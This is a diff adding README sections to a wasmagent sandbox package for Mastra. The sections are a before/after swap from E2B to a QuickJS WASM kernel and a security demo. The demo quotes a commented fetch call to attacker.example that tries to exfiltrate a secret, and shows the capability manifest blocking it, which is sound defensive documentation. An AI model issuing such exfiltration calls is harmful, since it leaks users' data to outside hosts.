@@ -33,6 +33,30 @@ something" is the workload. Use Blaxel/E2B when you need full POSIX, native
 binaries, or untrusted multi-tenant isolation across mutually-distrusting
 customers.
 
+## Before / After
+
+Replacing the E2B / Blaxel sandbox provider with a wasmagent WASM kernel:
+
+```diff
+-import { e2bSandbox } from "@mastra/e2b";
+-
+-const mastra = new Mastra({
+-  sandbox: e2bSandbox(),   // ← needs E2B account + API key + network
+-});
++import { createMastraSandbox } from "@wasmagent/mastra-sandbox";
++import { QuickJSKernel } from "@wasmagent/kernel-quickjs";
++
++const mastra = new Mastra({
++  sandbox: createMastraSandbox({
++    kernel: new QuickJSKernel(),   // ← in-process, no API key
++    capabilities: { allowedHosts: ["api.example.com"] },
++  }),
++});
+```
+
+Drop-in replacement: same `execute(code, opts) → { output }` contract that
+Mastra calls into, zero infrastructure changes, no billing.
+
 ## Install
 
 ```bash
@@ -81,6 +105,33 @@ same `kernel:` slot and the rest of your code is unchanged:
 | `RemoteSandboxKernel` (`/kernel-remote`) | Need full POSIX, native binaries, multi-tenant trust. Backed by E2B / Cloudflare Sandbox. | n/a |
 
 Swap is a one-liner — `kernel: new QuickJSKernel()` becomes `kernel: new PyodideKernel()`. Same `CapabilityManifest`, same provider contract, same Mastra Workspace API.
+
+## Security demo
+
+`CapabilityManifest` enforces network and filesystem policy at the kernel
+boundary — the model cannot escape it regardless of what code it generates:
+
+```ts
+import { createMastraSandbox } from "@wasmagent/mastra-sandbox";
+import { QuickJSKernel } from "@wasmagent/kernel-quickjs";
+
+const sandbox = createMastraSandbox({
+  kernel: new QuickJSKernel(),
+  capabilities: {
+    allowedHosts: [],           // no outbound network
+    allowedPaths: [],           // no filesystem access
+    cpuMs: 5_000,
+    memoryLimitBytes: 64 * 1024 * 1024,
+  },
+});
+
+// Model-generated code that tries to exfiltrate data:
+// fetch("https://attacker.example/exfil?data=secret")
+// → throws: network access denied — host "attacker.example" not in allowedHosts
+```
+
+The same manifest applies whether the script was triggered by a Mastra `Agent`,
+a workflow step, or a direct `sandbox.execute()` call.
 
 ## Capability manifest
 
